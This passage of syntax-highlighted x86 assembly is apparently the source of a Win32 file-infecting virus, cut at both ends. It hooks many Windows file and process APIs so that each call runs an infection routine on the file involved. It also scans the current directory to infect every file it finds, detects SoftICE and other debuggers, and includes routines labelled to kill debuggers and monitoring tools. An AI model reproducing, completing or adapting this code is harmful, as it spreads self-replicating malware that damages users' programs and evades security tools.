    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;push parameters</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc5">c_api</span><span class="sc0"> </span><span class="sc5">oldFindFirstFileA</span><span class="sc0">         </span><span class="sc1">;call original API</span><span class="sc0">

</span><span class="sc5">p_file</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;store all registers</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gtDelta</span><span class="sc0">                </span><span class="sc1">;get delta</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.cPushad</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get Win32 Find Data</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Check</span><span class="sc4">&amp;</span><span class="sc5">Infect</span><span class="sc0">           </span><span class="sc1">;try to infect file</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all registers</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                   </span><span class="sc1">;and quit</span><span class="sc0">

</span><span class="sc5">newFindNextFileA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;push parameters</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc5">c_api</span><span class="sc0"> </span><span class="sc5">oldFindNextFileA</span><span class="sc0">          </span><span class="sc1">;call previous API</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">p_file</span><span class="sc0">              </span><span class="sc1">;and continue</span><span class="sc0">


</span><span class="sc5">process_file</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;store all registers</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gtDelta</span><span class="sc0">                </span><span class="sc1">;get delta offset</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get Win32_Find_Data</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;save it</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.cPushad</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;push offset to filename</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddFindFirstFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;find that file</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_pf</span><span class="sc0">               </span><span class="sc1">;quit if error</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">               </span><span class="sc1">;handle to ECX</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;WFD to EBX</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Check</span><span class="sc4">&amp;</span><span class="sc5">Infect</span><span class="sc0">           </span><span class="sc1">;check and infect it</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddFindClose</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;close find handle</span><span class="sc0">
</span><span class="sc5">end_pf</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all registers</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;and quit</span><span class="sc0">

</span><span class="sc1">;generic hookers for some APIs</span><span class="sc0">
</span><span class="sc5">newCopyFileExA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">process_file</span><span class="sc0">
    </span><span class="sc5">j_api</span><span class="sc0"> </span><span class="sc5">oldCopyFileExA</span><span class="sc0">
</span><span class="sc5">newCopyFileA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">process_file</span><span class="sc0">
    </span><span class="sc5">j_api</span><span class="sc0"> </span><span class="sc5">oldCopyFileA</span><span class="sc0">
</span><span class="sc5">newCreateFileA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">process_file</span><span class="sc0">
    </span><span class="sc5">j_api</span><span class="sc0"> </span><span class="sc5">oldCreateFileA</span><span class="sc0">
</span><span class="sc5">newCreateProcessA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">process_file</span><span class="sc0">
    </span><span class="sc5">j_api</span><span class="sc0"> </span><span class="sc5">oldCreateProcessA</span><span class="sc0">
</span><span class="sc5">newDeleteFileA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">process_file</span><span class="sc0">
    </span><span class="sc5">j_api</span><span class="sc0"> </span><span class="sc5">oldDeleteFileA</span><span class="sc0">
</span><span class="sc5">newGetFileAttributesA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">process_file</span><span class="sc0">
    </span><span class="sc5">j_api</span><span class="sc0"> </span><span class="sc5">oldGetFileAttributesA</span><span class="sc0">
</span><span class="sc5">newGetFullPathNameA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">process_file</span><span class="sc0">
    </span><span class="sc5">j_api</span><span class="sc0"> </span><span class="sc5">oldGetFullPathNameA</span><span class="sc0">
</span><span class="sc5">new_lopen</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">process_file</span><span class="sc0">
    </span><span class="sc5">j_api</span><span class="sc0"> </span><span class="sc5">old_lopen</span><span class="sc0">
</span><span class="sc5">newMoveFileA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">process_file</span><span class="sc0">
    </span><span class="sc5">j_api</span><span class="sc0"> </span><span class="sc5">oldMoveFileA</span><span class="sc0">
</span><span class="sc5">newMoveFileExA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">process_file</span><span class="sc0">
    </span><span class="sc5">j_api</span><span class="sc0"> </span><span class="sc5">oldMoveFileExA</span><span class="sc0">
</span><span class="sc5">newOpenFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">process_file</span><span class="sc0">
    </span><span class="sc5">j_api</span><span class="sc0"> </span><span class="sc5">oldOpenFile</span><span class="sc0">
</span><span class="sc5">newSetFileAttributesA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">process_file</span><span class="sc0">
    </span><span class="sc5">j_api</span><span class="sc0"> </span><span class="sc5">oldSetFileAttributesA</span><span class="sc0">
</span><span class="sc5">newWinExec</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">process_file</span><span class="sc0">
    </span><span class="sc5">j_api</span><span class="sc0"> </span><span class="sc5">oldWinExec</span><span class="sc0">

</span><span class="sc5">open_driver</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;EAX=0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;parameters</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4000000h</span><span class="sc0">                           </span><span class="sc1">;for</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;CreateFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;API</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;function</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddCreateFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;open driver</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">close_driver</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;close its handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddCloseHandle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">common_stage</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;infect files in curr. directory</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gtDelta</span><span class="sc0">                </span><span class="sc1">;get delta offset</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;get context debug</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">n_debug</span><span class="sc0">               </span><span class="sc1">;if zero, debug is not present</span><span class="sc0">

</span><span class="sc5">k_debug</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ddGetCurrentProcessId</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;get ID number of current process</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vlcb_stuph</span><span class="sc0">             </span><span class="sc1">;common stuph</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">data_buffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.WFD_szAlternateFileName</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">    </span><span class="sc1">;set random data</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VLCB_Debug1</span><span class="sc0">            </span><span class="sc1">;kill debugger</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_set_VLCB</span><span class="sc0">           </span><span class="sc1">;IPC!</span><span class="sc0">

</span><span class="sc5">vlcb_stuph</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;random thread</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VLCB_SetWait</span><span class="sc0">           </span><span class="sc1">;set and wait for result</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">n_debug</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vlcb_stuph</span><span class="sc0">             </span><span class="sc1">;common stuph</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">data_buffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.WFD_szAlternateFileName</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">    </span><span class="sc1">;set random data</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VLCB_Debug2</span><span class="sc0">            </span><span class="sc1">;check for SoftICE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_set_VLCB</span><span class="sc0">           </span><span class="sc1">;IPC!</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.WFD_szAlternateFileName</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;get result</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">endEP</span><span class="sc0">                </span><span class="sc1">;quit if SoftICE in memory</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vlcb_stuph</span><span class="sc0">             </span><span class="sc1">;common stuph</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">data_buffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.WFD_szAlternateFileName</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">    </span><span class="sc1">;set random data</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VLCB_Monitor</span><span class="sc0">           </span><span class="sc1">;kill monitors</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_set_VLCB</span><span class="sc0">           </span><span class="sc1">;IPC!</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get Win32 Find Data</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;store its address</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">star</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*.*'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">;create mask</span><span class="sc0">
</span><span class="sc5">star</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ddFindFirstFileA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;find file</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">endEP</span><span class="sc0">                </span><span class="sc1">;if error, then quit</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">fHandle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;store handle</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Check</span><span class="sc4">&amp;</span><span class="sc5">Infect</span><span class="sc0">           </span><span class="sc1">;and try to infect file</span><span class="sc0">

</span><span class="sc5">findF</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get Win32 Find Data</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;store address</span><span class="sc0">
    </span><span class="sc5">push_LARGE_0</span><span class="sc0">                </span><span class="sc1">;store handle</span><span class="sc0">
</span><span class="sc5">fHandle</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ddFindNextFileA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;find next file</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">               </span><span class="sc1">;result to ECX</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">endEP2</span><span class="sc0">                </span><span class="sc1">;no more files, quit</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Check</span><span class="sc4">&amp;</span><span class="sc5">Infect</span><span class="sc0">           </span><span class="sc1">;try to infect file</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">findF</span><span class="sc0">               </span><span class="sc1">;find another file</span><span class="sc0">

</span><span class="sc5">endEP2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">fHandle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc1">;store handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ddFindClose</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;close it</span><span class="sc0">
</span><span class="sc5">endEP</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">newExitProcess</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;hooker for ExitProcess API</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">common_stage</span><span class="sc0">           </span><span class="sc1">;infect files in current directory</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gtDelta</span><span class="sc0">                </span><span class="sc1">;get delta offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">t_number</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get ID number of thread</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VLCB_SetWait</span><span class="sc0">           </span><span class="sc1">;set and wait for result</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">data_buffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.WFD_szAlternateFileName</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VLCB_Quit</span><span class="sc0">          </span><span class="sc1">;terminate thread</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_set_VLCB</span><span class="sc0">           </span><span class="sc1">;IPC!</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;number of thread</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VLCB_TSize</span><span class="sc0">            </span><span class="sc1">;now we will</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">VLCB_TSize</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">;erase thread</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;record</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;from VLCB</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VLCB_TSep</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosd</span><span class="sc0">               </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc5">j_api</span><span class="sc0"> </span><span class="sc5">oldExitProcess</span><span class="sc0">            </span><span class="sc1">;jump to original API</span><span class="sc0">


</span><span class="sc1">;next hookers</span><span class="sc0">
</span><span class="sc5">newExitThread</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">common_stage</span><span class="sc0">
    </span><span class="sc5">j_api</span><span class="sc0"> </span><span class="sc5">oldExitThread</span><span class="sc0">
</span><span class="sc5">newCloseHandle</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">common_stage</span><span class="sc0">
    </span><span class="sc5">j_api</span><span class="sc0"> </span><span class="sc5">oldCloseHandle</span><span class="sc0">
</span><span class="sc5">newGetLastError</span><span class="sc4">:</span><span class="sc0">
